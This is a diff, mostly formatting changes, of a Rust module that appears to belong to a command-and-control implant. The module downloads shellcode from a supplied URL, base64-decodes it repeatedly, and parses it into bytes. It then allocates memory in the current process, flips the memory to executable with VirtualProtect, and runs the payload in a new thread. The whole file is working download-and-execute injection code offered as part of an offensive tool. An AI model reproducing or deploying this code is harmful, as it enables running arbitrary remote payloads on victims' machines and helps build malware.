@@ -1,26 +1,43 @@
-use std::error::Error;
 use crate::logger::Logger;
-#[cfg(windows)] use base64::decode as b64_decode;
-#[cfg(windows)]extern crate kernel32;
-#[cfg(windows)]use winapi::um::winnt::{PVOID, PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ};
-#[cfg(windows)]use std::ptr;
-#[cfg(windows)]use std::io;
-#[cfg(windows)]use std::io::prelude::*;
-#[cfg(windows)]use std::io::{stdin, stdout, Read, Write};
-#[cfg(windows)]use winapi::um::errhandlingapi;
-#[cfg(windows)]use winapi::um::processthreadsapi;
-#[cfg(windows)]use winapi::um::winbase;
-#[cfg(windows)]use winapi::um::synchapi::WaitForSingleObject;
-#[cfg(windows)]use std::process;
-#[cfg(windows)] use reqwest::Client;
+#[cfg(windows)]
+use base64::decode as b64_decode;
+use std::error::Error;
+#[cfg(windows)]
+extern crate kernel32;
+#[cfg(windows)]
+use reqwest::Client;
+#[cfg(windows)]
+use std::io;
+#[cfg(windows)]
+use std::io::prelude::*;
+#[cfg(windows)]
+use std::io::{stdin, stdout, Read, Write};
+#[cfg(windows)]
+use std::process;
+#[cfg(windows)]
+use std::ptr;
+#[cfg(windows)]
+use winapi::um::errhandlingapi;
+#[cfg(windows)]
+use winapi::um::processthreadsapi;
+#[cfg(windows)]
+use winapi::um::synchapi::WaitForSingleObject;
+#[cfg(windows)]
+use winapi::um::winbase;
+#[cfg(windows)]
+use winapi::um::winnt::{
+    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
+    PROCESS_ALL_ACCESS, PVOID,
+};
 
 type DWORD = u32;
 
 pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, Box<dyn Error>> {
-    #[cfg(windows)] {
+    #[cfg(windows)]
+    {
         // Input: url to shellcode -p pid
         let mut args = base64_string.split(" ");
-        
+
         // Set up our variables; each one could fail on us.
         // Yes this is a lot of verbose error checking, but this
         // has to be rock solid or the agent will die.
@@ -29,11 +46,13 @@ pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, B
 
         // Get URL
         match args.nth(0) {
-            Some(u) => { 
+            Some(u) => {
                 logger.debug(format!("Shellcode URL: {}", &u));
-                url = u; 
-            },
-            None    => { return Ok("Could not parse URL".to_string()); }
+                url = u;
+            }
+            None => {
+                return Ok("Could not parse URL".to_string());
+            }
         };
 
         // Get b64_iterations
@@ -44,15 +63,17 @@ pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, B
                 } else {
                     return Ok("Could not parse b64 iterations".to_string());
                 }
-            },
-            None => { return Ok("Could not extract b64 iterations".to_string()); }
+            }
+            None => {
+                return Ok("Could not extract b64 iterations".to_string());
+            }
         };
 
         logger.debug(format!("Injecting into current process..."));
         let client = Client::new();
         if let Ok(r) = client.get(url).send().await {
-            if r.status().is_success() {   
-                logger.info(format!("Got the shellcode")); 
+            if r.status().is_success() {
+                logger.info(format!("Got the shellcode"));
                 // Get the shellcode. Now we have to decode it
                 let mut shellcode_encoded: Vec<u8>;
                 let mut shellcode_string: String;
@@ -64,14 +85,12 @@ pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, B
                         logger.debug(format!("Decode iteration: {i}"));
                         match b64_decode(shellcode_encoded) {
                             Ok(d) => {
-                                shellcode_encoded = d
-                                    .into_iter()
-                                    .filter(|&b| b != 0x0a)
-                                    .collect();
-                            },
-                            Err(e) => { return Ok(e.to_string()); }
+                                shellcode_encoded = d.into_iter().filter(|&b| b != 0x0a).collect();
+                            }
+                            Err(e) => {
+                                return Ok(e.to_string());
+                            }
                         };
-                        
                     }
                     // Convert bytes to our proper string
                     shellcode_string = String::from_utf8(shellcode_encoded)?;
@@ -80,107 +99,102 @@ pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, B
                     shellcode = shellcode_string
                         .split(",")
                         .map(|s| s.replace("0x", ""))
-                        .map(|s| s.replace(" ", ""))                    
-                        .map(|s|{ 
-                            match u8::from_str_radix(&s, 16) {
-                                Ok(b) => b,
-                                Err(_) => 0
-                            }
+                        .map(|s| s.replace(" ", ""))
+                        .map(|s| match u8::from_str_radix(&s, 16) {
+                            Ok(b) => b,
+                            Err(_) => 0,
                         })
                         .collect();
-    
                 } else {
                     let err_msg = "Could not decode shellcode";
                     logger.err(err_msg.to_string());
                     return Ok(err_msg.to_string());
                 }
-                
-                unsafe{
+
+                unsafe {
                     let base_addr = kernel32::VirtualAlloc(
                         ptr::null_mut(),
                         shellcode.len().try_into().unwrap(),
                         MEM_COMMIT | MEM_RESERVE,
-                        PAGE_READWRITE
+                        PAGE_READWRITE,
                     );
-                
-                    if base_addr.is_null() { 
+
+                    if base_addr.is_null() {
                         println!("[-] Couldn't allocate memory to current proc.")
                     } else {
                         println!("[+] Allocated memory to current proc.");
                     }
-    
+
                     // copy shellcode into mem
                     println!("[*] Copying Shellcode to address in current proc.");
-                    std::ptr::copy(shellcode.as_ptr() as  _, base_addr, shellcode.len());
+                    std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
                     println!("[*] Copied...");
-    
-    
+
                     // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
                     println!("[*] Changing mem protections to RX...");
-    
+
                     let mut old_protect: DWORD = PAGE_READWRITE;
-    
-                    let mem_protect = kernel32::VirtualProtect (
+
+                    let mem_protect = kernel32::VirtualProtect(
                         base_addr,
                         shellcode.len() as u64,
                         PAGE_EXECUTE_READ,
-                        &mut old_protect
+                        &mut old_protect,
                     );
-    
+
                     if mem_protect == 0 {
                         let error = errhandlingapi::GetLastError();
                         println!("[-] Error: {}", error.to_string());
                         process::exit(0x0100);
                     }
-    
-                // Call CreateThread
-    
-                println!("[*] Calling CreateThread...");
-    
-                let mut tid = 0;
-                let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
-    
-                let h_thread = processthreadsapi::CreateThread(
-                    ptr::null_mut(),
-                    0,
-                    Some(ep),
-                    ptr::null_mut(),
-                    0,
-                    &mut tid
-                );
-    
-                if h_thread.is_null() {
-                    let error = unsafe { errhandlingapi::GetLastError() };
-                    println!("{}", error.to_string())
-                
-                } else {
-                    println!("[+] Thread Id: {}", tid)
+
+                    // Call CreateThread
+
+                    println!("[*] Calling CreateThread...");
+
+                    let mut tid = 0;
+                    let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
+
+                    let h_thread = processthreadsapi::CreateThread(
+                        ptr::null_mut(),
+                        0,
+                        Some(ep),
+                        ptr::null_mut(),
+                        0,
+                        &mut tid,
+                    );
+
+                    if h_thread.is_null() {
+                        let error = unsafe { errhandlingapi::GetLastError() };
+                        println!("{}", error.to_string())
+                    } else {
+                        println!("[+] Thread Id: {}", tid)
+                    }
+
+                    // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
+
+                    println!("[*] Calling WaitForSingleObject...");
+
+                    let status = WaitForSingleObject(h_thread, winbase::INFINITE);
+                    if status == 0 {
+                        println!("[+] Good!")
+                    } else {
+                        let error = errhandlingapi::GetLastError();
+                        println!("{}", error.to_string())
+                    }
                 }
-    
-                // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
-    
-                println!("[*] Calling WaitForSingleObject...");
-    
-                let status = WaitForSingleObject(h_thread, winbase::INFINITE);
-                if status == 0 {
-                    println!("[+] Good!")
-                } else {
-                    let error = errhandlingapi::GetLastError();
-                    println!("{}", error.to_string())
-                }
-        }
-                
+
                 return Ok("Injection completed!".to_string());
             } else {
                 return Ok("Could not download shellcode".to_string());
-            }   
-
+            }
         } else {
             return Ok(format!("Could not download from {url}"));
         }
     }
-    
-    #[cfg(not(windows))] {
+
+    #[cfg(not(windows))]
+    {
         Ok("Can only inject shellcode on Windows!".to_string())
     }
 }
